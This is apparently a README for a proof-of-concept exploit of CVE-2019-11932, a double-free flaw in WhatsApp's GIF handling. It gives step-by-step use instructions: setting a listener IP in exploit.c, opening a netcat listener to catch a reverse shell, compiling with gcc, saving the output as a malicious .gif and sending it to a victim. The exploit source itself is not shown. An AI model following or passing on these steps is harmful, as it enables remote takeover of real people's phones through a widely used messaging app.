# CVE-2019-11932
 double-free bug in WhatsApp exploit poc.
 
 #Note: make sure to set the listner ip in exploit.c inorder to get shell
 
 nc -lvp 5555 or whatever port.
 
 and then compile.
 
 gcc -o exploit egif_lib.c exploit.c
 
 then run ./exploit and save the content to <filename>.gif
 
 and send to victim.
 
 #Source
 https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/.
 
 #Poc_Video
 https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view.         
 
 

 
 
  
